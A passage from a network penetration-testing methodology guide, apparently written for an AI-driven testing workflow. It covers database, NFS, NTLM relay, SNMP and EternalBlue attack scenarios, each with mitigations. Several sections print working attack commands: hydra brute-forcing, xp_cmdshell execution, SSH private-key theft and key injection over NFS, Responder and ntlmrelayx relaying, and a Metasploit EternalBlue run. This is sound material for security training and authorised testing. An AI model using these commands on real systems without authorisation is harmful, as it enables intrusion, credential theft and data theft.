|   Auth Plugin: mysql_native_password

# MySQL default/weak credential testing
mysql -h 192.168.1.50 -u root -p
# Try: root:root, root:password, root:toor, root:mysql

# MySQL credential bruteforce
hydra -L users.txt -P passwords.txt mysql://192.168.1.50

# PostgreSQL enumeration
nmap -p 5432 --script pgsql-brute 192.168.1.0/24

# PostgreSQL connection test
psql -h 192.168.1.50 -U postgres

# MSSQL enumeration
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info 192.168.1.0/24

# MSSQL authentication (SQL injection via xp_cmdshell)
impacket-mssqlclient DOMAIN/user:password@192.168.1.50

# Enable xp_cmdshell for RCE
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# MongoDB no-auth access
mongo --host 192.168.1.50 --port 27017
> show dbs
> use sensitive_db
> db.users.find()

# Redis no-auth access
redis-cli -h 192.168.1.50
> INFO
> KEYS *
> GET sensitive_key
```

**Impact:** Data breach, unauthorized access, privilege escalation, RCE via stored procedures

**Mitigation:** Strong authentication, network segmentation, disable xp_cmdshell, bind to localhost only, require authentication

---

#### Scenario 13: NFS Misconfiguration

```bash
# NFS share discovery
nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs 192.168.1.0/24

# Expected output:
2049/tcp open  nfs
| nfs-showmount:
|   /home *
|   /var/backups 192.168.1.0/24
|   /opt/data (everyone)

# Mount NFS share
showmount -e 192.168.1.50

# Expected output:
Export list for 192.168.1.50:
/home           *
/var/backups    192.168.1.0/24

# Mount as attacker
mkdir /mnt/nfs
mount -t nfs 192.168.1.50:/home /mnt/nfs
ls -la /mnt/nfs

# UID/GID manipulation for privilege escalation
# If /home is exported with no_root_squash:
# Create user with matching UID
useradd -u 1001 targetuser
su - targetuser
cd /mnt/nfs/targetuser
cat .ssh/id_rsa

# SSH key injection
mkdir /mnt/nfs/targetuser/.ssh
echo "attacker_public_key" > /mnt/nfs/targetuser/.ssh/authorized_keys
chmod 600 /mnt/nfs/targetuser/.ssh/authorized_keys

# SSH as targetuser
ssh targetuser@192.168.1.50
```

**Impact:** Unauthorized file access, SSH key injection, privilege escalation, data theft

**Mitigation:** Restrict NFS exports to specific hosts, use root_squash, enable Kerberos authentication (sec=krb5), proper file permissions

---

## Network Testing Scope Categories

### Internal Network Penetration Testing

**Objective:** Assess security from inside the network perimeter

**Common Targets:**
- Internal servers (file, database, application)
- Workstations and endpoints
- Network devices (switches, routers, firewalls)
- Internal applications and services
- Active Directory infrastructure
- Wireless networks (if applicable)

**Key Testing Areas:**
- Lateral movement paths
- Domain privilege escalation
- Network segmentation effectiveness
- Sensitive data exposure
- Credential harvesting opportunities

---

### External Network Penetration Testing

**Objective:** Assess security from internet perspective

**Common Targets:**
- Public-facing web servers
- Email servers (SMTP, IMAP, POP3)
- VPN endpoints
- DNS servers
- FTP/SFTP servers
- Remote access services (RDP, SSH)
- Cloud infrastructure endpoints

**Key Testing Areas:**
- External attack surface
- Internet-exposed vulnerabilities
- Remote code execution opportunities
- Authentication bypass
- Information disclosure

---

### Cloud Network Penetration Testing

**Objective:** Assess cloud infrastructure security

**Common Targets:**
- Cloud virtual networks (AWS VPC, Azure VNet, GCP VPC)
- Cloud instances/VMs
- Container orchestration (Kubernetes, ECS, AKS)
- Serverless functions (Lambda, Azure Functions)
- Cloud databases (RDS, CosmosDB, CloudSQL)
- Cloud storage (S3, Blob Storage, Cloud Storage)

**Key Testing Areas:**
- Misconfigurations (security groups, IAM)
- Metadata service abuse
- Cloud-native vulnerabilities
- Cross-account access
- Network segmentation in cloud

---

## MITRE ATT&CK Technique Categories

### Initial Access Techniques (Examples)

**T1133: External Remote Services**
- Test VPN authentication bypass
- Exploit RDP/SSH vulnerabilities
- Weak authentication on remote services

**T1190: Exploit Public-Facing Application**
- Web application vulnerabilities
- SQL injection, RCE
- Unpatched CVEs

**T1566: Phishing** (if social engineering in scope)
- Spear phishing attachments
- Phishing links
- Credential harvesting

**T1078: Valid Accounts**
- Credential stuffing
- Password spraying
- Default credentials

---

### Privilege Escalation Techniques (Examples)

**T1068: Exploitation for Privilege Escalation**
- Kernel exploits
- Sudo misconfigurations
- SUID binaries

**T1078: Valid Accounts**
- Compromised admin credentials
- Service account abuse

**T1543: Create or Modify System Process**
- Windows service manipulation
- Systemd service abuse

---

### Lateral Movement Techniques (Examples)

**T1021: Remote Services**
- RDP lateral movement
- SSH lateral movement
- WinRM/PSRemoting
- SMB/CIFS exploitation

**T1550: Use Alternate Authentication Material**
- Pass-the-Hash
- Pass-the-Ticket
- Kerberos exploitation

**T1570: Lateral Tool Transfer**
- Internal pivoting
- Proxy chains
- Port forwarding

---

### Credential Access Techniques (Examples)

**T1003: OS Credential Dumping**
- LSASS dumping
- SAM database extraction
- /etc/shadow extraction
- Cached credentials

**T1110: Brute Force**
- Password spraying
- Credential stuffing
- Dictionary attacks

**T1555: Credentials from Password Stores**
- Browser credential theft
- Password manager exploitation
- KeePass, LastPass attacks

---

## Testing Methodology Structure

### EXPLORE Phase
1. **Scope Review**
   - Read SCOPE.md engagement requirements
   - Identify network ranges, IP addresses
   - Understand out-of-scope items
   - Clarify testing window and rules

2. **Initial Reconnaissance**
   - Passive OSINT (DNS, WHOIS, Shodan)
   - Active scanning (Nmap, Masscan)
   - Service enumeration
   - Network mapping

3. **Service-Specific Research** (CRITICAL)
   - **For each discovered service, research attack techniques:**
     - Use Context7 for library/service documentation: `bun tools/api/context7/client.ts quick "security vulnerabilities" <service-name>`
     - Use WebFetch for official documentation and CVE databases
     - Reference books: See `private/docs/book-catalog.md` for domain mapping
   - **Examples:**
     - MySQL 5.7.33 → Context7/WebFetch MySQL vulnerabilities, default credentials, UDF injection
     - Apache 2.4.29 → WebFetch Apache CVE list, mod_cgi exploits
     - OpenSSH 7.4 → WebFetch known vulnerabilities, user enumeration techniques
     - IIS 10.0 → WebFetch IIS exploits, WebDAV misconfigurations
   - **Document findings:**
     - Known CVEs for specific versions
     - Default credentials to test
     - Service-specific exploitation techniques
     - Relevant Metasploit modules

4. **MITRE ATT&CK Mapping**
   - Map discovered services to potential techniques
   - Identify likely attack paths based on research
   - Reference framework for technique details

### PLAN Phase
1. **Prioritize Targets**
   - Critical systems identified
   - High-value targets (domain controllers, databases)
   - Easy wins (known vulnerabilities)

2. **Tool Inventory Check** (CRITICAL)
   - Review `/servers` for available tools
   - Check for: Nmap, Metasploit, Impacket, Responder, Bloodhound, etc.
   - Identify missing tools needed for testing
   - Request deployment if gaps exist

3. **Attack Path Planning**
   - Initial access methods
   - Privilege escalation paths
   - Lateral movement routes
   - Credential access opportunities

4. **Test Plan Generation**
   - Map to MITRE ATT&CK techniques
   - Document testing approach per target
   - Include success criteria
   - Get user approval before proceeding

### CODE Phase (Execution)
1. **Initial Access**
   - Execute planned attack vectors
   - Document successful techniques
   - Map to MITRE ATT&CK IDs

2. **Post-Exploitation**
   - Enumerate compromised systems
   - Escalate privileges where possible
   - Harvest credentials
   - Identify lateral movement opportunities

3. **Lateral Movement**
   - Pivot to additional systems
   - Test network segmentation
   - Document access paths

4. **Objective Achievement**
   - Reach testing goals (domain admin, sensitive data, etc.)
   - Document evidence (screenshots, command output)
   - Map all techniques used to MITRE ATT&CK

### COMMIT Phase (Reporting)
1. **Findings Documentation**
   - Executive summary
   - Technical findings with MITRE ATT&CK mapping
   - Evidence (screenshots, logs, exploit code)
   - Attack path diagrams

2. **Remediation Recommendations**
   - Prioritized by risk (critical to low)
   - Specific remediation steps
   - Defense-in-depth suggestions
   - Long-term security improvements

3. **MITRE ATT&CK Integration**
   - Map all successful techniques to ATT&CK IDs
   - Include detection recommendations per technique
   - Reference ATT&CK for defensive controls

---

## Common Network Vulnerabilities

### Network Services
- **Unpatched Services:** Known CVEs in SSH, RDP, SMB, FTP
- **Weak Authentication:** Default credentials, weak passwords
- **Misconfigured Services:** Anonymous FTP, SMB null sessions
- **Outdated Protocols:** SMBv1, TLS 1.0/1.1, SSLv3

### Windows Domain Environment
- **Kerberoasting:** Service account password extraction
- **AS-REP Roasting:** Accounts without Kerberos pre-auth
- **NTLM Relay:** SMB/HTTP NTLM relay attacks
- **Unconstrained Delegation:** Privilege escalation via delegation
- **Zerologon (CVE-2020-1472):** Domain controller exploitation
- **PrintNightmare (CVE-2021-34527):** Print spooler RCE

### Linux/Unix Systems
- **Sudo Misconfigurations:** NOPASSWD, command injection
- **SUID Binaries:** Privilege escalation via SUID
- **Kernel Exploits:** DirtyCow, others based on version
- **Cron Job Abuse:** Writable cron scripts
- **Docker Misconfigurations:** Exposed Docker socket

### Network Infrastructure
- **Default Credentials:** Routers, switches, firewalls
- **SNMP Community Strings:** Public/private exposure
- **Telnet Enabled:** Unencrypted management
- **Weak VPN Configs:** Outdated ciphers, no MFA

---

## Vulnerability Finding Examples

### Finding 1: NTLM Relay — Unauthenticated Domain Compromise

**Severity:** Critical (CVSS 9.8)
**ATT&CK:** T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)

**Vulnerable Configuration:**
```
SMB Signing: Disabled (default on workstations)
LLMNR: Enabled (default)
NBT-NS: Enabled (default)
Network: Flat — no segmentation between workstations and servers
```

**Exploitation:**
```bash
# Step 1: Start Responder to capture NTLM hashes
responder -I eth0 -wrf

# Step 2: Relay captured hashes to target with SMB signing disabled
ntlmrelayx.py -tf targets.txt -smb2support -i

# Expected output:
# [*] HTTPD: Received connection from 192.168.1.50
# [*] Authenticating against smb://192.168.1.100 as CORP\jsmith
# [*] Target 192.168.1.100 is VULNERABLE to relay (SMB signing not required)
# [*] Started interactive SMB client shell on 127.0.0.1:11000
# [*] SOCKS: Adding CORP/jsmith@192.168.1.100 to relay list

# Step 3: Access relayed session
nc 127.0.0.1 11000
# shares> use C$
# shares> get Users\Administrator\Desktop\sensitive.txt
```

**Impact:**
- Unauthenticated attacker on network can compromise domain-joined systems
- No credentials required — passive poisoning captures authentication attempts
- Leads to lateral movement, credential dumping, and domain compromise

**Remediation:**
1. **Enable SMB signing** on all systems (GPO: `Microsoft network server: Digitally sign communications (always)`)
2. **Disable LLMNR:** GPO → Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution
3. **Disable NBT-NS:** Network adapter → IPv4 → Advanced → WINS → Disable NetBIOS over TCP/IP
4. **Network segmentation:** Isolate workstation VLANs from server VLANs

**Real-World Impact:** NTLM relay is one of the most commonly exploited attack paths in internal penetration tests. Microsoft's own guidance recommends enforcing SMB signing, but it remains disabled by default on workstations.

---

### Finding 2: Exposed SNMP v2c with Default Community String

**Severity:** High (CVSS 7.5)
**ATT&CK:** T1602.001 (SNMP - MIB Dump)

**Vulnerable Configuration:**
```
SNMP Version: v2c (no encryption, no authentication)
Community String: public (default read)
Community String: private (default write)
Device: Cisco IOS router — core network infrastructure
```

**Discovery:**
```bash
# Scan for SNMP services
nmap -sU -p 161 --script snmp-brute 192.168.1.0/24

# Expected output:
# PORT    STATE SERVICE
# 161/udp open  snmp
# | snmp-brute:
# |   public - Valid credentials
# |   private - Valid credentials

# Extract full device configuration
snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1

# Extract running config (Cisco)
snmpget -v 2c -c private 192.168.1.1 1.3.6.1.4.1.9.9.96.1.1.1.1.4
```

**Impact:**
- Full network topology disclosure (routing tables, ARP tables, interface configs)
- Device configuration extraction (ACLs, VLAN configs, sometimes credentials)
- Write access via `private` community string enables configuration modification
- Potential for traffic redirection, VLAN hopping, or complete network disruption

**Remediation:**
1. **Upgrade to SNMPv3** with authentication (SHA) and encryption (AES)
2. **Change community strings** from defaults if v2c must remain
3. **Restrict SNMP access** via ACLs to management VLAN only
4. **Disable SNMP write** access unless operationally required
5. **Monitor SNMP queries** in SIEM for anomalous access patterns

---

### Finding 3: EternalBlue (MS17-010) — Unpatched SMBv1

**Severity:** Critical (CVSS 9.8)
**ATT&CK:** T1210 (Exploitation of Remote Services)
**CVE:** CVE-2017-0144

**Discovery:**
```bash
# Scan for vulnerability
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.0/24

# Expected output:
# PORT    STATE SERVICE
# 445/tcp open  microsoft-ds
# | smb-vuln-ms17-010:
# |   VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
# |     State: VULNERABLE
# |     Risk factor: HIGH
```

**Exploitation:**
```bash
# Metasploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.50
msf6 > set LHOST 192.168.1.100
msf6 > exploit

# [+] 192.168.1.50:445 - Target is vulnerable!
# [*] Meterpreter session 1 opened
# meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

**Impact:**
- Unauthenticated remote code execution as SYSTEM
- No user interaction required
- Wormable — can propagate across the network automatically
- Full system compromise leading to credential dumping and lateral movement

**Remediation:**
1. **Apply MS17-010 patch** (KB4012212/KB4012215) immediately
2. **Disable SMBv1** (PowerShell: `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`)
3. **Block port 445** at network perimeter
4. **Network segmentation** to limit lateral movement if exploited

**Real-World Impact:** EternalBlue was used in WannaCry (2017) and NotPetya (2017), causing billions in damages globally. Despite being patched since 2017, unpatched systems are still found in internal assessments.

---

## Reference Resources

### Local Resources (Dynamic Discovery)

**MITRE ATLAS:** `standards/frameworks/mitre-atlas/` — controls.yaml (89 techniques), questions.yaml

**Books:** See `private/docs/book-catalog.md`
- Network/Red Team: `private/books/security/rtfm-red-team-v2-2022/`, `private/books/security/hands-on-hacking-2020/`, `private/books/development/black-hat-python-2021/`

### Web Resources

**MITRE ATT&CK:**
- Website: https://attack.mitre.org/

**NIST SP 800-115:**
- Website: https://csrc.nist.gov/publications/detail/sp/800-115/final
- Guide: Technical Guide to Information Security Testing and Assessment

---

**Created:** 2025-12-01
**Framework:** Intelligence Adjacent (IA) - Security Testing
**Version:** 1.0
